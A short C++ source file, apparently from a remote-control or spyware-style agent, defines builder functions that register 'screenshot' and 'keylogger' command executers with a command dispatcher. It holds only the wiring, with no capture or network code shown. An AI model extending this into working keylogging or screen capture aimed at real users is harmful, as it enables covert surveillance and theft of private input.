#include "utils/builders.h"

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"
#include "stl/unique.h"


std::unique_ptr<command::ICommandExecuter>
utils::builders::BuildScreenshotExecuter()
{
    return ( std::make_unique<command::ScreenshotExecuter>(1, "screenshot") );
}

std::unique_ptr<command::ICommandExecuter>
utils::builders::BuildKeyloggerExecuter()
{
    return ( std::make_unique<command::KeyloggerExecuter>(2, "keylogger") );
}

std::unique_ptr<command::CommandManager>
utils::builders::BuildManager()
{
    auto dispatcher = std::make_unique<command::CommandManager>();

    dispatcher->Add(BuildScreenshotExecuter().release());
    dispatcher->Add(BuildKeyloggerExecuter().release());

    return ( dispatcher );
}


